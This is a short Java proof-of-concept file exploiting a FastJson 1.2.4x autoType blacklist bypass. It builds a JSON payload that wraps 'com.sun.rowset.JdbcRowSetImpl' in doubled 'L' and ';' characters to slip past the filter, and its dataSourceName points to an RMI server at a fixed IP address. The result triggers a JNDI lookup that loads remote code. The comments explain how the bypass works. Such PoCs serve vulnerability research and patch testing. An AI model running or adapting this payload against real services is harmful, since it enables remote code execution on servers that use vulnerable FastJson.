import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class ByPass_1242_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson 1.2.41 JNDI PoC");
        // First, we should manually set autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // And then, just put `L` before and `;` after :)
        // Double it, for the reason that LXXX; is blocked in this version
        // And due to its recursive resolve, LL ;; will be removed :)
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://192.168.37.134:1099/j1dse2\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
